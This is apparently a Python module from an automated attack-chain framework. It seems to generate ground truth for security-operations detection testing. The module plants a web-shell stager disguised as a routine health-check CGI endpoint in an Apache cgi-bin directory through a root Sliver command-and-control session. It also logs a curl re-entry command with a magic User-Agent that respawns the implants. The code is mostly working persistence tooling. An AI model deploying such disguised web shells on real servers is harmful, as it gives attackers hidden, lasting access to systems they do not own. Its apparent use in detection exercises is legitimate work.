"""Advanced web-shell persistence drop on the apache webserver.

Runs immediately after :mod:`advanced_webserver_privesc` (which produced the
root Sliver session). Drops a tiny CGI stager into
``/usr/local/apache2/cgi-bin/`` -- a directory owned by ``john.stravidis``
(mode 0775), so this drop *requires* root (www-data couldn't write here
during the earlier enumeration phase).

The stager looks like a routine health-check endpoint to anyone glancing
at ``cgi-bin/``. When curl'd with the magic User-Agent it re-runs the
in-memory loader, respawning the Sliver implants without going through the
CVE path-traversal again. See ``payloads/health_check.cgi`` for details.

Splitting persistence out of the privesc step keeps each chain step
tightly scoped to a single ATT&CK tactic, so the SOC analyst's per-step
detection-beat correlation is unambiguous (T1505.003 file CREATE on
cgi-bin gets a dedicated start/end window in ``chain-<ts>.json``).
"""
# MITRE ATT&CK:
#   T1505.003 – Server Software Component: Web Shell   (cgi-bin persistence)

from pathlib import Path

from chainlog import log
from advanced_initial_access import sliver_exec, sliver_upload

# Local CGI stager + remote landing path on apache.
STAGER_LOCAL_PATH  = "/Attack-chain/payloads/health_check.cgi"
STAGER_REMOTE_PATH = "/usr/local/apache2/cgi-bin/health_check.cgi"


def run(root_sliver_session: str, kali_host: str = "10.10.0.2") -> dict:
    """Drop the cgi-bin web-shell stager as root.

    Args:
        root_sliver_session: ID of the root session implant created by
                             :mod:`advanced_webserver_privesc`.
        kali_host:           accepted for adapter parity; unused here
                             (the stager hard-codes the kali host in its
                             own source for re-entry).

    Returns:
        dict for ``ctx.state``:
            ``persistence_path`` -- the remote path of the dropped stager,
            or ``None`` if the local stager file was missing on kali.
    """
    _ = kali_host
    log("\n[*] Starting T1505.003 web-shell persistence drop (as root)")

    if not Path(STAGER_LOCAL_PATH).is_file():
        log(f"[-] stager missing on kali: {STAGER_LOCAL_PATH} -- skipping")
        return {"persistence_path": None}

    log(f"[*] sliver: upload {STAGER_LOCAL_PATH} -> {STAGER_REMOTE_PATH}  (chmod 755)")
    sliver_upload(
        root_sliver_session,
        STAGER_LOCAL_PATH,
        STAGER_REMOTE_PATH,
        chmod="755",
    )
    # Confirm the upload landed; output goes to the chainlog so the SOC
    # ground truth has a clean record.
    sliver_exec(
        root_sliver_session,
        f"execute -o ls -la {STAGER_REMOTE_PATH}",
    )
    log(f"[+] persistence path: {STAGER_REMOTE_PATH}")
    log("    re-entry: curl -A 'ReSpawnHttpdCache/1.0' http://router/cgi-bin/health_check.cgi")
    return {"persistence_path": STAGER_REMOTE_PATH}
